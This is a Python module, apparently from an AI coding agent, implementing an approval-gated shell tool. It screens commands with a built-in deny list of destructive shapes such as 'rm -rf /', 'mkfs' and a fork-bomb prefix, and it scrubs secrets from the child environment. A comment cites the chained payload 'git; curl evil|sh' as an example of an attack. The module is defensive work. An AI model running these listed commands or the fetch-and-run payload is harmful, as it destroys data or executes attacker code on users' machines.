"""Shell v1 — the `run_command` tool, CRYS-native (no third-party server).

POLICY AMENDMENT (2026-06-11): the original sandboxFirst rule
("no shell before an OS sandbox") is amended to: approval-gated shell
NOW, OS sandbox required before shell is ever auto-approved. The
boundary in this phase is the human, deliberately:

  * EVERY command is individually approved in the REPL. `/auto` does
    not lift shell prompts, and 'a' (approve-for-session) is not
    offered for shell — there is no way to stop seeing the commands.
  * Headless background runs DENY shell outright: the git branch
    protects the repo, not the machine, and there is nobody watching.
  * Commands are screened before the user is even asked: a built-in
    deny list of catastrophic shapes, plus an optional per-project
    allow/deny in `.crystal-code.json` under "shell".
  * The child process gets a SCRUBBED environment — anything that
    looks like a key, token, secret, or password never reaches it —
    and runs with the project folder as its working directory, a hard
    timeout, and tail-truncated output (token economics).

What approval does NOT protect against, stated honestly: a command you
approve runs with your OS permissions and your network. The prompt
shows you exactly what will run; reading it is the contract.

Config (all optional), in `.crystal-code.json`:

    "shell": {
      "allow": ["git", "pytest", "python", "npm"],   // command name allow-list
      "deny": ["push --force"],                       // substring screens
      "timeout_seconds": 120
    }

Execution model (E1b, 2026-07-03): interactive human-approved commands run
with shell features (pipes, redirects, chaining) — the human approves the
exact string. Auto-approved commands (when full-auto shell ships) run with
shell=False as an argv vector and are screened to reject shell operators,
so the allow-list is enforced on the ACTUAL command, not just its first
word. See screen_command_no_shell / execute_command.
"""
from __future__ import annotations

import asyncio
import os
import subprocess
from pathlib import Path
from typing import Any, Optional

from crystal_cache.agent import Tool, get_registry

SHELL_TOOL_NAME = "run_command"
DEFAULT_TIMEOUT_SECONDS = 120
_MAX_OUTPUT_CHARS = 4000

# Env var name fragments that must never reach a child process.
_SENSITIVE_ENV = (
    "API_KEY", "APIKEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
    "CREDENTIAL", "PRIVATE_KEY", "AUTH",
)

# Catastrophic command shapes, denied before the user is even prompted.
# Small on purpose — the per-command prompt is the main boundary; this
# list only catches things no one should be asked to approve.
_BUILTIN_DENY = (
    "sudo ", "shutdown", "reboot", "mkfs", "diskpart",
    "reg delete", "del /s", "rd /s", "rmdir /s",
    "rm -rf /", "rm -rf ~", "rm -rf *", ":(){", "dd if=",
    "> /dev/sd", "chmod -r 777 /",
)


def scrubbed_env() -> dict[str, str]:
    """The parent environment minus anything secret-shaped."""
    return {
        k: v for k, v in os.environ.items()
        if not any(s in k.upper() for s in _SENSITIVE_ENV)
    }


def screen_command(
    command: str,
    allow: Optional[list[str]] = None,
    deny: Optional[list[str]] = None,
) -> Optional[str]:
    """Why this command may not even be ASKED about, or None if it may.

    Built-in deny shapes first, then the project's own deny substrings,
    then the allow list (when present, the command's first word must be
    on it). Matching is case-insensitive on whitespace-normalized text.
    """
    low = " ".join(command.lower().split())
    if not low:
        return "empty command"
    for pat in _BUILTIN_DENY:
        if pat in low:
            return f"matches the built-in deny pattern {pat.strip()!r}"
    for pat in deny or []:
        p = " ".join(str(pat).lower().split())
        if p and p in low:
            return f"matches the project's deny pattern {pat!r}"
    if allow:
        first = command.strip().split()[0]
        # Platform-independent basename: split on both separators, so
        # 'C:\\Python\\python.EXE' normalizes to 'python' everywhere.
        name = first.replace("\\", "/").rsplit("/", 1)[-1].lower()
        if name.endswith(".exe"):
            name = name[:-4]
        allowed = {str(a).strip().lower() for a in allow if str(a).strip()}
        if name not in allowed:
            return (
                f"{name!r} is not on the project's shell allow list "
                f"({', '.join(sorted(allowed))})"
            )
    return None


# ---------------------------------------------------------------------------
# E1b hardening (2026-07-03): segment-aware screening + no-shell execution.
#
# The first-word allow-list check above is only sound when a HUMAN approves
# the full command string (interactive mode) — they see `git; curl evil|sh`
# and decline it. It is NOT sound for AUTO-approved shell, because under
# shell=True the allow-list passes on the first word (`git`) and the shell
# then runs the chained payload. Before shell is ever auto-approved (full
# auto is on the near roadmap), the auto path MUST:
#   1. reject any shell-operator metacharacters that chain/observe commands
#      (so the string is a single command, not a script), AND
#   2. execute as an argv vector with shell=False (so even a missed operator
#      is an inert argument, not a shell instruction).
# Interactive (human-approved) commands keep shell=True and its
# conveniences — the human is the boundary there, by design.
# ---------------------------------------------------------------------------

# Metacharacters that chain, pipe, redirect, background, substitute, or
# glob a command. Their presence means the string is more than one command
# (or observes the environment), so the auto path refuses it outright.
_SHELL_METACHARACTERS = (
    ";", "|", "&", "$", "`", ">", "<", "\n", "(", ")", "{", "}",
)


def screen_command_no_shell(
    command: str,
    allow: Optional[list[str]] = None,
    deny: Optional[list[str]] = None,
) -> Optional[str]:
    """Stricter screen for the AUTO (no-human) path. Runs the normal screen
    first, then REFUSES any shell metacharacter so the command cannot chain
    or observe. Returns the refusal reason, or None if the command is a
    single allow-listed invocation safe to run with shell=False.
    """
    base = screen_command(command, allow, deny)
    if base:
        return base
    for ch in _SHELL_METACHARACTERS:
        if ch in command:
            disp = "newline" if ch == "\n" else repr(ch)
            return (
                f"contains the shell metacharacter {disp}; auto-approved "
                "commands must be a single command with no chaining, "
                "piping, redirection, or substitution"
            )
    return None


def execute_command(
    command: str,
    project_dir: Path,
    timeout: int,
    *,
    allow_shell_features: bool,
) -> subprocess.CompletedProcess:
    """Run one command, choosing the execution model by trust context.

    E1c Phase 0 (2026-07-03): this now delegates to the shared
    sandbox.sandbox_run() chokepoint so that ALL model-influenced execution
    (shell, verify, guard hooks) flows through one seam the sandbox backend
    plugs into. Behavior is unchanged at Phase 0 (passthrough backend). The
    return is adapted back to a CompletedProcess so existing callers are
    untouched.

    allow_shell_features=True  (INTERACTIVE, human-approved): shell=True, so
        pipes/redirects/&& work. The human saw and approved the exact
        string; the shell is a convenience, not a risk.
    allow_shell_features=False (AUTO, no human): shell=False with an argv
        vector. Shell operators cannot be interpreted. Callers MUST have
        passed screen_command_no_shell first (which rejects operators).
    """
    from .sandbox import SandboxProfile, sandbox_run

    result = sandbox_run(
        command, project_dir, timeout,
        allow_shell_features=allow_shell_features,
        profile=SandboxProfile.CPU,
    )
    # Adapt to CompletedProcess for the existing _impl contract. The sandbox
    # already combines + truncates output; put it on stdout, stderr empty.
    rc = 124 if result.timed_out else result.exit_code
    return subprocess.CompletedProcess(
        args=command, returncode=rc, stdout=result.output, stderr="",
    )


def register_shell_tool(project_dir: Path, shell_cfg: Optional[dict] = None) -> bool:
    """Register `run_command` into the shared registry (once per process).

    The guard is the approval boundary; this impl is the execution
    mechanics. Screening also runs here as a backstop, but the guard
    screens BEFORE prompting so the user is never asked to approve a
    command that screening would refuse anyway.
    """
    registry = get_registry()
    if SHELL_TOOL_NAME in registry:
        return False

    cfg = shell_cfg or {}
    allow = cfg.get("allow") if isinstance(cfg.get("allow"), list) else None
    deny = cfg.get("deny") if isinstance(cfg.get("deny"), list) else None
    try:
        timeout = int(cfg.get("timeout_seconds", DEFAULT_TIMEOUT_SECONDS))
    except (TypeError, ValueError):
        timeout = DEFAULT_TIMEOUT_SECONDS

    async def _impl(customer_id: str, command: str = "", **kwargs: Any) -> dict[str, Any]:
        # customer_id is the registry contract; shell is project-scoped.
        #
        # Execution-model selection (E1b, 2026-07-03): the guard approves
        # shell interactively today (the human is the boundary), so we run
        # with shell features enabled. When auto-approved shell is added,
        # the guard will pass auto_shell=True in tool_input; that path is
        # screened with screen_command_no_shell (rejects operators) and
        # executed with shell=False, so a chained payload can never run
        # without a human having seen the exact string.
        auto = bool(kwargs.get("auto_shell", False))
        screen = screen_command_no_shell if auto else screen_command
        reason = screen(command, allow, deny)
        if reason:
            return {
                "exit_code": -1,
                "output": f"command refused: {reason}",
                "is_error": True,
            }
        # E1c Phase 0: execute through the shared sandbox chokepoint. The
        # E1b execution-model split is preserved via allow_shell_features.
        from .sandbox import SandboxProfile, sandbox_run_async

        result = await sandbox_run_async(
            command, project_dir, timeout,
            allow_shell_features=not auto,
            profile=SandboxProfile.CPU,
        )
        return {
            "exit_code": -1 if result.timed_out else result.exit_code,
            "output": result.output,
            "is_error": result.is_error,
        }

    registry.register(Tool(
        name=SHELL_TOOL_NAME,
        description=(
            "Run a shell command in the project folder. The user sees and "
            "individually approves EVERY command before it executes — "
            "propose precise, single-purpose commands and explain why when "
            "it isn't obvious. The environment is scrubbed of secrets; "
            "output is truncated to the tail. Prefer run_verify for the "
            "project's test command, and the file tools for reading or "
            "editing files."
        ),
        contexts=frozenset({"agent"}),
        parameters_schema={
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The exact shell command to run, e.g. 'git status' or 'python scripts/check.py'.",
                },
            },
            "required": ["command"],
        },
        impl=_impl,
    ))
    return True
